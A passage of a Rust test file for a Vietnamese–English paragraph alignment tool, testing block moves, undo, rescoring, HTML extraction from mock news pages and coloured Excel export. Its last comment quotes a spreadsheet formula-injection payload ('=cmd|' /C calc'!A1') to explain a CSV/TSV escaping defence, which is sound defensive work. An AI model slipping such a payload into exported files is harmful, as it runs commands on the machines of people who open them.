/// 27. TÁCH khối thành hàng riêng (nút ⇥): khối rời ô → thành hàng đơn phía chèn sau
/// hàng mốc; hàng đích mất khối cuối cùng tự xoá; thao tác ngược lại hoàn toàn.
fn t_block_detach_newrow() -> Result<(), String> {
    let en: Vec<String> = vec![
        "First English paragraph of the article.".into(),
        "Second English paragraph of the article.".into(),
    ];
    let vi: Vec<String> = vec![
        "Đoạn tiếng Việt thứ nhất của bài.".into(),
        "Đoạn tiếng Việt thứ hai của bài.".into(),
    ];
    let rows = vec![
        pair_row(0, 0, &en, &vi, Status::AutoMatched, Some(0.9)),
        pair_row(1, 1, &en, &vi, Status::AutoMatched, Some(0.9)),
    ];
    let mut s = manual_session(en, vi, rows);
    // tách khối VI của hàng 1 thành hàng riêng sau hàng 1
    let focus = s
        .move_block(Side::Vi, 1, 0, None, 0, Some(1))
        .map_err(|e| e)?;
    if s.rows.len() != 3 {
        return Err(format!("sau tách phải 3 hàng, được {}", s.rows.len()));
    }
    if focus != 2 {
        return Err(format!("hàng mới phải ở vị trí 2, được {}", focus));
    }
    let new_row = &s.rows[2];
    if new_row.vi_index != Some(1)
        || new_row.en_index.is_some()
        || new_row.status != Status::Unmatched
    {
        return Err("hàng tách phải là VI-only đoạn 1, unmatched".into());
    }
    // hàng nguồn giờ còn mỗi EN → unmatched, điểm xoá
    let src = &s.rows[1];
    if src.vi_index.is_some() || src.status != Status::Unmatched || src.score.is_some() {
        return Err("hàng nguồn mất phía VI phải unmatched + xoá điểm".into());
    }
    // hoàn tác → về 2 hàng như đầu
    s.undo().map_err(|e| e)?;
    if s.rows.len() != 2 || s.rows[1].vi_index != Some(1) {
        return Err("hoàn tác tách phải trả về 2 hàng ghép đôi như đầu".into());
    }
    Ok(())
}

/// 28. RESCAN: chấm lại điểm một hàng sau khi kéo (LaBSE nếu có, sàn từ vựng luôn),
/// cập nhật trạng thái theo ngưỡng; hàng một phía phải từ chối kèm hướng dẫn.
fn t_rescan_row() -> Result<(), String> {
    let en: Vec<String> = vec![
        "Alpha company shipped 100 units in 2025 to Hanoi.".into(),
        "Beta project with completely unrelated wording here.".into(),
    ];
    let vi: Vec<String> = vec![
        "Công ty Alpha xuất xưởng 100 sản phẩm năm 2025 tại Hà Nội.".into(),
        "Dự án Beta với cách diễn đạt hoàn toàn không liên quan ở đây.".into(),
    ];
    let rows = vec![
        pair_row(0, 0, &en, &vi, Status::AutoMatched, Some(0.95)),
        pair_row(1, 1, &en, &vi, Status::AutoMatched, Some(0.95)),
        Row::single_side(
            Some((1, "English paragraph without translation.".into())),
            None,
            Status::Unmatched,
        ),
    ];
    let mut s = manual_session(en, vi, rows);
    // cặp A–A1: điểm chấm lại phải cao (≥ ngưỡng) → tự khớp.
    // BẢN 2.8.1 — TIÊM nguồn cosine = None (mô phỏng máy không LaBSE) thay vì
    // trông chờ môi trường: bài kiểm phải ĐẠT kể cả khi LaBSE thật đang chạy
    // trên máy người dùng (lỗi 39/41 trên máy thật ngày 19/10/2026).
    let (score_a, st_a, used_a) = s.rescan_row_with(0, &|_, _| None).map_err(|e| e)?;
    if used_a {
        return Err("tiêm nguồn None (không LaBSE) thì labse_used phải là false".into());
    }
    if !(0.0..=1.0).contains(&score_a) {
        return Err(format!("điểm rescan phải trong 0..1, được {}", score_a));
    }
    if st_a != Status::AutoMatched {
        return Err(format!(
            "cặp dịch đúng sau rescan phải auto_matched, được {:?}",
            st_a
        ));
    }
    // điểm của rescan phải KHỚP công thức thuần (nguồn tiêm None → thuần từ vựng)
    let en_text = s.rows[0]
        .en_segments()
        .iter()
        .map(|(_, t)| *t)
        .collect::<Vec<&str>>()
        .join(" ");
    let vi_text = s.rows[0]
        .vi_segments()
        .iter()
        .map(|(_, t)| *t)
        .collect::<Vec<&str>>()
        .join(" ");
    let expect = aligner::rescore_pair(&s.english, &s.vietnamese, &en_text, &vi_text, None);
    if (score_a - expect).abs() > 0.002 {
        return Err(format!(
            "rescan phải đúng công thức rescore_pair: {:.3} vs {:.3}",
            score_a, expect
        ));
    }
    // BẢN 2.8.1 — đường CÓ LaBSE qua rescan thật (tiêm cos=1): labse_used=true,
    // điểm đúng công thức hoà trộn và KHÔNG thấp hơn đường thuần từ vựng
    // (chỉ được NÂNG điểm, không hạ).
    let expect_hi = aligner::rescore_pair(&s.english, &s.vietnamese, &en_text, &vi_text, Some(1.0));
    let (score_hi, _, used_hi) = s.rescan_row_with(0, &|_, _| Some(1.0)).map_err(|e| e)?;
    if !used_hi {
        return Err("tiêm nguồn Some(cos=1) thì labse_used phải là true".into());
    }
    if (score_hi - expect_hi).abs() > 0.002 {
        return Err(format!(
            "rescan với cos=1 phải đúng công thức hoà trộn: {:.3} vs {:.3}",
            score_hi, expect_hi
        ));
    }
    if score_hi + 1e-9 < score_a {
        return Err(format!(
            "hoà trộn cos=1 chỉ được NÂNG điểm rescan: {:.3} < {:.3}",
            score_hi, score_a
        ));
    }
    // hàng một phía phải từ chối kèm hướng dẫn (hàng 2: EN-only)
    let err = s.rescan_row_with(2, &|_, _| None).map(|_| ()).unwrap_err();
    if !err.contains("một phía") {
        return Err(format!(
            "thông báo từ chối phải nói rõ hàng một phía, được: {}",
            err
        ));
    }
    // sau rescan vẫn hoàn tác được (trả lại điểm cũ) — 2 lần rescan hàng 0 →
    // undo 2 nhấn trả về điểm gốc 0.95
    s.undo().map_err(|e| e)?;
    s.undo().map_err(|e| e)?;
    if s.rows[0].score != Some(0.95) {
        return Err("hoàn tác rescan phải trả lại điểm cũ".into());
    }
    Ok(())
}

/// 29. Xuất SAU KHI ĐỔI THỨ TỰ khối giữa các hàng: tha thứ đơn điệu I3 (cờ reordered),
/// nhưng I1 (mỗi đoạn đúng 1 lần) vẫn gắt — trao đổi chéo 2 khối VI rồi xuất đủ format.
fn t_export_after_reorder() -> Result<(), String> {
    let en: Vec<String> = vec![
        "First paragraph about policy changes in 2025.".into(),
        "Second paragraph about the committee report.".into(),
    ];
    let vi: Vec<String> = vec![
        "Đoạn đầu về các thay đổi chính sách năm 2025.".into(),
        "Đoạn thứ hai về báo cáo của uỷ ban.".into(),
    ];
    let rows = vec![
        pair_row(0, 0, &en, &vi, Status::AutoMatched, Some(0.9)),
        pair_row(1, 1, &en, &vi, Status::AutoMatched, Some(0.9)),
    ];
    let mut s = manual_session(en, vi, rows);
    // tráo chéo: VI[1] lên hàng 0, VI[0] xuống hàng 1 — phá đơn điệu có chủ đích
    s.move_block(Side::Vi, 1, 0, Some(0), 1, None)
        .map_err(|e| e)?;
    s.move_block(Side::Vi, 0, 0, Some(1), 1, None)
        .map_err(|e| e)?;
    if !s.reordered {
        return Err("cờ reordered phải bật sau khi tráo chéo khối giữa các hàng".into());
    }
    // xuất 6 định dạng phải ĐẠT (I3 được tha thứ vì sắp xếp lại là ý đồ người dùng)
    for fmt in [
        ExportFormat::Tsv,
        ExportFormat::Moses,
        ExportFormat::Json,
        ExportFormat::Csv,
        ExportFormat::Html,
        ExportFormat::Xliff,
    ] {
        let r = export_session(&s, fmt)?;
        if r.rows != 2 {
            return Err(format!("{:?}: phải 2 hàng, được {}", fmt, r.rows));
        }
    }
    // TSV: hàng 0 phải là EN[0] + VI[1], hàng 1 là EN[1] + VI[0]
    let r = export_session(&s, ExportFormat::Tsv)?;
    let line0: Vec<&str> = r
        .content
        .lines()
        .next()
        .ok_or("TSV rỗng")?
        .split('\t')
        .collect();
    if line0[1] != "Đoạn thứ hai về báo cáo của uỷ ban." {
        return Err("hàng 0 phải ghép EN[0] với VI[1] sau khi tráo chéo".into());
    }
    // I1 VẪN GẮT: giờ cố tình làm hỏng (nhân đôi 1 khối) → mọi export phải từ chối
    let mut broken = s.clone();
    broken.rows[1].vi_extra.push(crate::aligner::Seg::new(
        1,
        "Đoạn thứ hai về báo cáo của uỷ ban.".into(),
    ));
    if export_session(&broken, ExportFormat::Tsv).is_ok() {
        return Err(
            "I1 bị phá (đoạn dùng 2 lần) thì export phải từ chối, kể cả đã reordered".into(),
        );
    }
    // phiên CHƯA reordered mà đơn điệu bị phá → export cũng phải từ chối (I3 gắt)
    let mut fake = s.clone();
    fake.reordered = false;
    if export_session(&fake, ExportFormat::Tsv).is_ok() {
        return Err("phiên chưa đánh dấu reordered mà I3 vỡ phải bị từ chối".into());
    }
    Ok(())
}

/// 30. Đầu vào xấu của move_block + no-op không đẩy history: bảo vệ khỏi kéo thả lệch.
fn t_move_invalid() -> Result<(), String> {
    let en: Vec<String> = vec!["English source paragraph.".into()];
    let vi: Vec<String> = vec!["Đoạn tiếng Việt tương ứng.".into()];
    let mut s = manual_session(
        en,
        vi,
        vec![pair_row(
            0,
            0,
            &vec!["English source paragraph.".into()],
            &vec!["Đoạn tiếng Việt tương ứng.".into()],
            Status::AutoMatched,
            Some(0.9),
        )],
    );
    // hàng nguồn không tồn tại
    if s.move_block(Side::En, 9, 0, Some(0), 0, None).is_ok() {
        return Err("hàng nguồn ngoài phạm vi phải bị từ chối".into());
    }
    // vị trí khối không tồn tại
    if s.move_block(Side::En, 0, 5, Some(0), 0, None).is_ok() {
        return Err("vị trí khối ngoài phạm vi phải bị từ chối".into());
    }
    // hàng đích không tồn tại
    if s.move_block(Side::En, 0, 0, Some(7), 0, None).is_ok() {
        return Err("hàng đích ngoài phạm vi phải bị từ chối".into());
    }
    // hàng mốc (khi tách) không tồn tại
    if s.move_block(Side::En, 0, 0, None, 0, Some(7)).is_ok() {
        return Err("hàng mốc ngoài phạm vi phải bị từ chối".into());
    }
    // no-op: thả đúng chỗ cũ → không đẩy history (undo stack vẫn rỗng)
    s.move_block(Side::En, 0, 0, Some(0), 0, None)
        .map_err(|e| e)?;
    if !s.undo_stack.is_empty() {
        return Err("no-op không được đẩy vào ngăn hoàn tác".into());
    }
    // giá trị trả về vẫn hợp lệ
    Ok(())
}

/// Chạy toàn bộ bộ kiểm. Mỗi bài chạy trong thread riêng để panic (nếu có)
/// không làm sập cả tiến trình — panics được coi là FAIL có thông báo.
// ========================= [BẢN 2.6] bộ lọc chrom 3 tầng khi tải URL =========================

/// 31. [BẢN 2.6][REGRESSION] ribbon/mega-menu/modal/comment của báo gốc (tuoitre.vn)
/// không dùng thẻ <nav> mà dùng div/ul mang class — bản ≤2.5 hớt 11 khối menu +
/// 26 khối popup/form vào văn bản. Mô phỏng đúng cấu trúc thật đã sao chụp từ trang.
fn t_mega_menu_extract() -> Result<(), String> {
    let html = r##"<html><head><title>Báo gốc — bài viết mẫu</title></head><body>
<div class="wapper"><div class="popup-megamenu"><div class="container"><div class="mg_body">
<div class="mg_bodyleft"><ul class="list_all_menu_main">
<li><a href="/video.htm" class="name_menu_main">Video</a>
<ul class="ribbon-col"><li><a href="/tin-moi-nhat.htm" class="nav-link">Mới nhất</a></li>
<li><a href="/tin-nong.htm" class="nav-link">Tin nóng</a></li>
<li class="moremenu"><span>Xem thêm...</span></li></ul></li>
<li><a href="/the-gioi.htm" class="name_menu_main">Thế giới</a>
<ul class="sub_all_menu_main"><li data-zoneid="94"><a href="/binh-luan.htm">Bình luận</a></li>
<li data-zoneid="312"><a href="/kieu-bao.htm">Kiều bào</a></li>
<li class="moremenu"><span>Xem thêm...</span></li></ul></li>
</ul></div>
<div class="mg_bodyright"><ul class="mg_r_menu"><li><a href="/bau-cu.htm">Bầu cử Mỹ 2024</a></li></ul></div>
</div></div></div></div>
<article>
<p class="detail-sapo" data-role="sapo">Tối 16-10, Thủ tướng Lê Minh Hưng dự và phát biểu tại lễ công bố sản phẩm đạt Thương hiệu quốc gia Việt Nam lần thứ 10 năm 2026.</p>
<div class="detail-content afcbc-body">
<figure class="VCSortableInPreviewMode" type="Photo"><div><img src="x.jpeg" alt=""/></div>
<figcaption class="PhotoCMS_Caption"><p>Thủ tướng Lê Minh Hưng - Ảnh: C.DŨNG</p></figcaption></figure>
<p>Qua hơn hai thập kỷ, chương trình đã xây dựng thương hiệu dựa trên ba giá trị cốt lõi, góp phần nâng cao năng lực cạnh tranh của doanh nghiệp Việt Nam.</p>
<figure class="VCSortableInPreviewMode" type="Photo"><div><img src="y.jpeg" alt=""/></div>
<figcaption><p>Thương hiệu quốc gia Việt Nam năm 2026 đã tăng lên trên 462 tỉ USD, tăng 45,14% so với năm 2020 và xếp thứ 32 trong số 193 quốc gia được xếp hạng về giá trị thương hiệu.</p></figcaption></figure>
<div class="VCSortableInPreviewMode alignCenter"><div><p>227 doanh nghiệp được công nhận năm nay sở hữu gần 5.700 nhãn hiệu, sáng chế, giải pháp hữu ích và hơn 2.400 chứng chỉ, tiêu chuẩn quốc tế.</p></div></div>
<p class="VCObjectBoxRelatedNewsItemSapo">Chiều 29-9, Bộ Công Thương tổ chức họp báo giới thiệu và cung cấp thông tin về lễ công bố sản phẩm đạt Thương hiệu quốc gia Việt Nam.</p>
</div></article>
<div class="modal__payment loginssopop"><div class="modal__content"><div class="middle">
<div class="form-group"><p class="warning">Thông tin đăng nhập không đúng.</p></div>
<p>Có lỗi phát sinh. Vui lòng thử lại sau.</p></div></div></div>
<div class="detail-comment"><section class="comment-wrapper clearfix"><div class="comment_list">
<p class="text-no-comment">Hiện chưa có bình luận nào, hãy là người đầu tiên bình luận</p></div></section></div>
<div class="detail__newslette"><div class="flex"><div class="left">
<p class="des">Tuổi Trẻ Online sẽ gởi đến bạn những tin tức nổi bật nhất trong ngày.</p></div></div></div>
<div class="modal_introduce"><div class="popup"><div class="content"><p><b>Thêm chuyên mục, tăng trải nghiệm</b></p>
<p>Từ ngày 1-1-2023, chúng tôi giới thiệu phiên bản đặc biệt dành riêng cho các thành viên với nhiều ưu đãi hấp dẫn hơn.</p></div></div></div>
</body></html>"##;
    let (_title, paras) = fetcher::extract(html);
    let expected: [&str; 4] = [
        "Tối 16-10, Thủ tướng Lê Minh Hưng dự và phát biểu",
        "Qua hơn hai thập kỷ, chương trình đã xây dựng thương hiệu",
        // caption DÀI (≥100 ký tự, không credit) trong figcaption vẫn được GIỮ
        "Thương hiệu quốc gia Việt Nam năm 2026 đã tăng lên trên 462 tỉ USD",
        "227 doanh nghiệp được công nhận năm nay sở hữu gần 5.700 nhãn hiệu",
    ];
    if paras.len() != expected.len() {
        return Err(format!(
            "kỳ vọng {} đoạn (chỉ nội dung bài), được {}: {:#?}",
            expected.len(),
            paras.len(),
            paras
        ));
    }
    for (i, (got, want)) in paras.iter().zip(expected.iter()).enumerate() {
        if !got.contains(want) {
            return Err(format!(
                "đoạn {} phải chứa {:?}, được {:?}",
                i + 1,
                want,
                got
            ));
        }
    }
    // mọi khối rác phải bị BỎ toàn bộ
    for must_drop in [
        "Mới nhất",
        "Bình luận",
        "Bầu cử Mỹ 2024",
        "Xem thêm",
        "Ảnh: C.DŨNG",
        "Thông tin đăng nhập không đúng",
        "Hiện chưa có bình luận",
        "Tuổi Trẻ Online sẽ gởi",
        "Thêm chuyên mục",
        "Chiều 29-9, Bộ Công Thương",
    ] {
        if paras.iter().any(|p| p.contains(must_drop)) {
            return Err(format!("chrom '{}' phải bị lượt bỏ khi tải URL", must_drop));
        }
    }
    Ok(())
}

/// 32. [BẢN 2.6] caption/credit ảnh: credit ngắn bị bỏ, caption dài được giữ,
/// quy tắc credit KHÔNG áp ngoài <figure> (đoạn thật nhắc "Ảnh:" vẫn giữ).
fn t_caption_credit_extract() -> Result<(), String> {
    let html = r##"<html><head><title>Caption test</title></head><body><article>
<figure><img src="a.jpg" alt=""/><figcaption><p>Chú thích ảnh ngắn.</p></figcaption></figure>
<figure><img src="b.jpg" alt=""/><figcaption><p>Ảnh: TRẦN VĂN A</p></figcaption></figure>
<figure><img src="c.jpg" alt=""/><figcaption><p>Nguồn: Reuters — tổng hợp dữ liệu thị trường trong quý.</p></figcaption></figure>
<figure><figcaption><p>Đây là một chú thích dài và có ý nghĩa giải thích cho bức ảnh, được viết thành câu văn trọn vẹn với nhiều thông tin ngữ cảnh quan trọng của sự kiện, đủ vượt ngưỡng một trăm ký tự để được xem là nội dung thật.</p></figcaption></figure>
<p>Đoạn văn thật có nhắc tới nguồn ảnh: "theo Ảnh:越通社 trong bài" và vẫn phải được giữ nguyên vì không nằm trong figure.</p>
</article></body></html>"##;
    let (_t, paras) = fetcher::extract(html);
    let joined = paras.join("\n");
    for must_keep in [
        "Đây là một chú thích dài và có ý nghĩa giải thích",
        "Đoạn văn thật có nhắc tới nguồn ảnh",
    ] {
        if !joined.contains(must_keep) {
            return Err(format!("'{}' phải được GIỮ nhưng bị lọc nhầm", must_keep));
        }
    }
    for must_drop in ["Chú thích ảnh ngắn.", "Ảnh: TRẦN VĂN A", "Nguồn: Reuters"] {
        if joined.contains(must_drop) {
            return Err(format!("credit/caption '{}' phải bị bỏ", must_drop));
        }
    }
    if paras.len() != 2 {
        return Err(format!(
            "kỳ vọng 2 đoạn, được {}: {:#?}",
            paras.len(),
            paras
        ));
    }
    Ok(())
}

/// 33. [BẢN 2.6] "link farm": ul không mang class gì vẫn bị nhận diện là menu nhờ
/// mật độ link; mục danh sách thật và đoạn có ít link vẫn được giữ.
fn t_link_farm_extract() -> Result<(), String> {
    let html = r##"<html><head><title>Link farm</title></head><body><article>
<ul class="clearfix">
<li><a href="/a">Bóng đá</a> <a href="/b">Bóng rổ</a> <a href="/c">Võ thuật</a> <a href="/d">Khỏe 360</a> <a href="/e">Video</a> <a href="/f">SEA Games 31</a> <a href="/g">Tin tức</a></li>
<li>Hạ ngưỡng công bố quyên góp từ 16.900 AUD xuống còn 1.000 AUD cho mỗi lần tài trợ.</li>
<li><a href="/x">Đọc thêm: bài viết liên quan rất dài về chủ đề tương tự ở chuyên mục khác</a></li>
</ul>
<p>Đoạn văn thật có một <a href="/ref">liên kết tham chiếu</a> duy nhất, tỷ lệ ký tự nằm trong link rất thấp nên vẫn được giữ lại.</p>
</article></body></html>"##;
    let (_t, paras) = fetcher::extract(html);
    let expected: [&str; 2] = [
        "Hạ ngưỡng công bố quyên góp",
        "Đoạn văn thật có một liên kết tham chiếu",
    ];
    if paras.len() != expected.len() {
        return Err(format!(
            "kỳ vọng {} đoạn (bỏ link farm + li chỉ toàn link), được {}: {:#?}",
            expected.len(),
            paras.len(),
            paras
        ));
    }
    for (i, (got, want)) in paras.iter().zip(expected.iter()).enumerate() {
        if !got.contains(want) {
            return Err(format!(
                "đoạn {} phải chứa {:?}, được {:?}",
                i + 1,
                want,
                got
            ));
        }
    }
    Ok(())
}

// ========================= Đọc kiểm file .xlsx (BẢN 2.7) =========================

/// Đọc một entry text từ file zip .xlsx.
fn zip_read(bytes: &[u8], name: &str) -> Result<String, String> {
    let mut za = zip::ZipArchive::new(std::io::Cursor::new(bytes))
        .map_err(|e| format!("mở zip xlsx: {}", e))?;
    let mut s = String::new();
    za.by_name(name)
        .map_err(|e| format!("zip thiếu {}: {}", name, e))?
        .read_to_string(&mut s)
        .map_err(|e| format!("đọc {}: {}", name, e))?;
    Ok(s)
}

/// Đoạn giữa 2 dấu hiệu (lần đầu tiên tìm được).
fn between<'a>(s: &'a str, open: &str, close: &str) -> Option<&'a str> {
    let i = s.find(open)? + open.len();
    let j = s[i..].find(close)? + i;
    Some(&s[i..j])
}

/// Danh sách màu fill (rgb) theo thứ tự <fill> trong styles.xml — chỉ số = fillId.
fn xlsx_fill_colors(styles: &str) -> Vec<String> {
    let block = between(styles, "<fills", "</fills>").unwrap_or("");
    block
        .split("<fill>")
        .skip(1)
        .map(|f| match f.find("rgb=\"") {
            Some(i) => {
                let rest = &f[i + 5..];
                let end = rest.find('"').unwrap_or(rest.len());
                rest[..end].to_string()
            }
            None => String::new(),
        })
        .collect()
}

/// fillId của từng <xf> trong <cellXfs> — chỉ số xf chính là s= của ô.
fn xlsx_xf_fill_ids(styles: &str) -> Vec<usize> {
    let block = between(styles, "<cellXfs", "</cellXfs>").unwrap_or("");
    block
        .split("<xf ")
        .skip(1)
        .map(|xf| match xf.find("fillId=\"") {
            Some(i) => {
                let rest = &xf[i + 8..];
                let end = rest.find('"').unwrap_or(rest.len());
                rest[..end].parse().unwrap_or(usize::MAX)
            }
            None => usize::MAX,
        })
        .collect()
}

/// Màu nền của ô A{row} (row 1-based như sheet) qua s= → xf → fillId → rgb.
fn xlsx_row_fill(sheet: &str, fills: &[String], xfs: &[usize], row: u32) -> Result<String, String> {
    let row_marker = format!("<row r=\"{}\"", row);
    let i = sheet
        .find(&row_marker)
        .ok_or_else(|| format!("sheet thiếu hàng {}", row))?;
    let rest = &sheet[i..];
    let end = rest.find("</row>").unwrap_or(rest.len());
    let chunk = &rest[..end];
    let cell_marker = format!("<c r=\"A{}\"", row);
    let ci = chunk
        .find(&cell_marker)
        .ok_or_else(|| format!("hàng {} thiếu ô A mang style", row))?;
    let zone = &chunk[ci..(ci + 120).min(chunk.len())];
    let si = zone
        .find("s=\"")
        .ok_or_else(|| format!("ô A{} không mang style s=", row))?;
    let after = &zone[si + 3..];
    let endq = after.find('"').unwrap_or(after.len());
    let s: usize = after[..endq]
        .parse()
        .map_err(|_| format!("s= của ô A{} không phải số", row))?;
    let fid = *xfs
        .get(s)
        .ok_or_else(|| format!("style s={} vượt cellXfs", s))?;
    Ok(fills.get(fid).cloned().unwrap_or_default())
}

/// 34. [BẢN 2.7] Excel (.xlsx): tự tô màu ô theo trạng thái hàng — đọc lại file zip
/// (styles.xml + sheet1.xml + sharedStrings.xml) kiểm chứng fill ĐÚNG TỪNG HÀNG:
/// xanh nhạt E2EFDA = tự khớp + đã xác nhận · vàng nhạt FFF2CC = cần soát ·
/// hồng nhạt FADCE3 = không khớp; kèm header màu, đóng băng dòng đầu, autofilter,
/// chú giải màu dưới bảng và `none` nguyên văn trong ô phía thiếu.
fn t_export_xlsx_colors() -> Result<(), String> {
    let en0 = "Hanoi hosted the summit in 2025, drawing 4,000 guests.";
    let en1 = "An English only paragraph goes here without any translation.";
    let en2 = "The final matched pair carries a yellow review flag.";
    let vi0 = "Hà Nội tổ chức hội nghị năm 2025, thu hút 4.000 khách.";
    let vi1 = "Đây là đoạn tiếng Việt thừa, không có bản tiếng Anh tương ứng.";
    let vi2 = "Cặp cuối cùng mang cờ cần soát màu vàng.";

    let rows = vec![
        Row {
            index: 0,
            en_index: Some(0),
            vi_index: Some(0),
            en: Some(en0.into()),
            vi: Some(vi0.into()),
            en_extra: Vec::new(),
            vi_extra: Vec::new(),
            status: Status::AutoMatched,
            score: Some(0.85),
        },
        Row {
            index: 1,
            en_index: Some(1),
            vi_index: None,
            en: Some(en1.into()),
            vi: None,
            en_extra: Vec::new(),
            vi_extra: Vec::new(),
            status: Status::Unmatched,
            score: None,
        },
        Row {
            index: 2,
            en_index: None,
            vi_index: Some(1),
            en: None,
            vi: Some(vi1.into()),
            en_extra: Vec::new(),
            vi_extra: Vec::new(),
            status: Status::HumanConfirmed,
            score: None,
        },
        Row {
            index: 3,
            en_index: Some(2),
            vi_index: Some(2),
            en: Some(en2.into()),
            vi: Some(vi2.into()),
            en_extra: Vec::new(),
            vi_extra: Vec::new(),
            status: Status::NeedsReview,
            score: Some(0.42),
        },
    ];
    let session = Session {
        id: "test-xlsx27".into(),
        title: "Excel màu 2.7".into(),
        created_at: 1,
        updated_at: 1,
        english: vec![en0.into(), en1.into(), en2.into()],
        vietnamese: vec![vi0.into(), vi1.into(), vi2.into()],
        rows,
        options: AlignOptions {
            auto_threshold: 0.30,
        },
        engine: "lexical".into(),
        reordered: false,
        undo_stack: Vec::new(),
        redo_stack: Vec::new(),
    };

    let r = export_session(&session, ExportFormat::Xlsx)?;
    let bytes = r
        .bytes
        .as_ref()
        .ok_or("xlsx phải trả về bytes (không phải content)")?;
    if !r.content.is_empty() {
        return Err("xlsx phải để content rỗng".into());
    }
    if !bytes.starts_with(b"PK\x03\x04") {
        return Err("xlsx phải là file zip (magic PK)".into());
    }
    if !r.filename.ends_with(".xlsx") {
        return Err(format!("tên file phải .xlsx, được {}", r.filename));
    }
    if !r.mime.contains("spreadsheetml") {
        return Err(format!("mime sai: {}", r.mime));
    }
    if r.rows != 4 || r.none_count != 2 {
        return Err(format!(
            "rows/none phải 4/2, được {}/{}",
            r.rows, r.none_count
        ));
    }

    let styles = zip_read(bytes, "xl/styles.xml")?;
    let sheet = zip_read(bytes, "xl/worksheets/sheet1.xml")?;
    let shared = zip_read(bytes, "xl/sharedStrings.xml")?;

    // 4 màu phải có mặt trong styles: header + 3 màu trạng thái
    for c in ["FFDCEEE8", "FFE2EFDA", "FFFFF2CC", "FFFADCE3"] {
        if !styles.contains(c) {
            return Err(format!("styles.xml thiếu màu {}", c));
        }
    }

    // mỗi hàng Excel (1-based) phải mang đúng màu nền qua ô A
    let fills = xlsx_fill_colors(&styles);
    let xfs = xlsx_xf_fill_ids(&styles);
    let expect: [(u32, &str); 8] = [
        (1, "FFDCEEE8"),  // header
        (2, "FFE2EFDA"),  // tự khớp
        (3, "FFFADCE3"),  // không khớp (chỉ EN)
        (4, "FFE2EFDA"),  // đã xác nhận (chỉ VI)
        (5, "FFFFF2CC"),  // cần soát
        (8, "FFE2EFDA"),  // chú giải: xanh (0-based 7 → r=8)
        (9, "FFFFF2CC"),  // chú giải: vàng
        (10, "FFFADCE3"), // chú giải: hồng
    ];
    for (row_no, rgb) in expect {
        let got = xlsx_row_fill(&sheet, &fills, &xfs, row_no)?;
        if got != rgb {
            return Err(format!("hàng {} phải nền {}, được {}", row_no, rgb, got));
        }
    }

    // văn bản: header, nhãn trạng thái, none nguyên văn, nội dung hàng, chú giải
    for must in [
        "STT",
        "Tiếng Anh",
        "Tiếng Việt",
        "Điểm",
        "Trạng thái",
        "Tự khớp",
        "Cần soát",
        "Không khớp",
        "Đã xác nhận",
        "<t>none</t>",
        en0,
        vi1,
        en2,
        "Khớp / khớp phần lớn — tự khớp + đã xác nhận",
        "Không khớp hoàn toàn",
    ] {
        if !shared.contains(must) {
            return Err(format!("sharedStrings thiếu {:?}", must));
        }
    }
    // autofilter + đóng băng dòng đầu phải có mặt trong sheet
    if !sheet.contains("<autoFilter") {
        return Err("sheet thiếu autofilter (lọc theo Trạng thái)".into());
    }
    if !sheet.contains("<pane ") {
        return Err("sheet thiếu đóng băng dòng đầu (freeze panes)".into());
    }
    Ok(())
}

/// 35. [BẢN 2.7] xlsx cho HÀNG GỘP: nhiều đoạn nằm chung một ô (mỗi đoạn một dòng),
/// alias "excel", meta file (ext/mime/is_binary), màu vẫn đúng sau gộp.
fn t_export_xlsx_merged() -> Result<(), String> {
    // alias + meta
    if ExportFormat::parse("xlsx") != Some(ExportFormat::Xlsx)
        || ExportFormat::parse("excel") != Some(ExportFormat::Xlsx)
    {
        return Err("parse phải nhận 'xlsx' và 'excel'".into());
    }
    if ExportFormat::Xlsx.ext() != "xlsx" || !ExportFormat::Xlsx.is_binary() {
        return Err("ext/is_binary của Xlsx sai".into());
    }
    if ExportFormat::Csv.is_binary() || ExportFormat::Tsv.is_binary() {
        return Err("định dạng văn bản không được là binary".into());
    }

    let en_a = "First English segment of a merged row in this test.";
    let en_b = "Second English segment joined by drag and drop.";
    let vi_a = "Đoạn Việt của hàng đã gộp hai đoạn tiếng Anh.";
    let vi_b = "Đoạn Việt thừa không có bản tiếng Anh đi kèm.";
    let rows = vec![
        Row {
            index: 0,
            en_index: Some(0),
            vi_index: Some(0),
            en: Some(en_a.into()),
            vi: Some(vi_a.into()),
            en_extra: vec![crate::aligner::Seg::new(1, en_b.into())],
            vi_extra: Vec::new(),
            status: Status::AutoMatched,
            score: Some(0.71),
        },
        Row {
            index: 1,
            en_index: None,
            vi_index: Some(1),
            en: None,
            vi: Some(vi_b.into()),
            en_extra: Vec::new(),
            vi_extra: Vec::new(),
            status: Status::Unmatched,
            score: None,
        },
    ];
    let session = Session {
        id: "test-xlsx27b".into(),
        title: "xlsx hàng gộp".into(),
        created_at: 1,
        updated_at: 1,
        english: vec![en_a.into(), en_b.into()],
        vietnamese: vec![vi_a.into(), vi_b.into()],
        rows,
        options: AlignOptions {
            auto_threshold: 0.30,
        },
        engine: "lexical".into(),
        reordered: false,
        undo_stack: Vec::new(),
        redo_stack: Vec::new(),
    };

    let r = export_session(&session, ExportFormat::Xlsx)?;
    let bytes = r.bytes.as_ref().ok_or("xlsx phải trả bytes")?;
    if r.none_count != 1 || r.rows != 2 {
        return Err(format!(
            "rows/none phải 2/1, được {}/{}",
            r.rows, r.none_count
        ));
    }
    let styles = zip_read(bytes, "xl/styles.xml")?;
    let sheet = zip_read(bytes, "xl/worksheets/sheet1.xml")?;
    let shared = zip_read(bytes, "xl/sharedStrings.xml")?;

    // ô EN của hàng gộp chứa CẢ HAI đoạn, ngăn nhau bằng xuống dòng (raw hoặc &#10;)
    let joined_raw = format!("{}\n{}", en_a, en_b);
    let joined_esc = format!("{}&#10;{}", en_a, en_b);
    if !shared.contains(&joined_raw) && !shared.contains(&joined_esc) {
        return Err("ô EN của hàng gộp phải chứa cả 2 đoạn (ngăn xuống dòng)".into());
    }
    if !shared.contains("<t>none</t>") {
        return Err("hàng VI-only phải ghi 'none' phía EN".into());
    }
    // màu: hàng gộp (tự khớp) = xanh, hàng VI-only (không khớp) = hồng
    let fills = xlsx_fill_colors(&styles);
    let xfs = xlsx_xf_fill_ids(&styles);
    for (row_no, rgb) in [(2u32, "FFE2EFDA"), (3u32, "FFFADCE3")] {
        let got = xlsx_row_fill(&sheet, &fills, &xfs, row_no)?;
        if got != rgb {
            return Err(format!("hàng {} phải nền {}, được {}", row_no, rgb, got));
        }
    }
    Ok(())
}

/// 36. [AUDIT 2026-10-18] CSV/TSV PHÒNG CHÈN CÔNG THỨC: ô bắt đầu bằng = + - @
/// (vd "=cmd|' /C calc'!A1" trong văn bản được dán vào) phải được thêm dấu `'`
/// trước khi ghi ra CSV/TSV — Excel mở file sẽ coi là văn bản, không chạy công thức.
